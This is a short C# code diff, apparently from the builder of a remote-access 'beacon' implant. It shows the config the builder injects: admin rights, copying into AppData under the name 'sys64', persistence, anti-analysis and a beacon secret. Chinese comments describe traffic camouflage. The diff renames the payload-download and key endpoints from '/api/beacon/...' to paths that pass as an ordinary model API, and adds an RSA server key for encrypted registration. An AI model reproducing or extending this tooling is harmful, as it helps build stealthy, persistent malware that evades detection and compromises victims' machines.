@@ -317,14 +317,16 @@ public partial class BuilderBuildService
             require_admin = req.RequireAdmin,
             copy_to_path = req.CopyToAppData ? "sys64" : null,
             enable_persistence = req.EnablePersistence,
-            core_download_path = $"/api/beacon/core/{ctx.BuildId}",
-            core_key_path = "/api/beacon/core-key",
+            core_download_path = $"/api/v1/models/{ctx.BuildId}",
+            core_key_path = "/api/v1/auth/token",
             beacon_secret = _beaconSettings.Secret,
             anti_analysis = req.AntiAnalysis,
             // 流量伪装（构建页面编辑注入；注册后服务端 profile 可覆盖）
             user_agents = req.UserAgents ?? new(),
             extra_headers = req.ExtraHeaders ?? new(),
             path_suffixes = req.PathSuffixes ?? new(),
+            // 服务端 RSA 公钥：注册/密钥协商混合加密
+            server_public_key = _serverKeys.PublicKeyDerBase64,
         };
 
         var configJson = JsonSerializer.Serialize(injectedConfig);
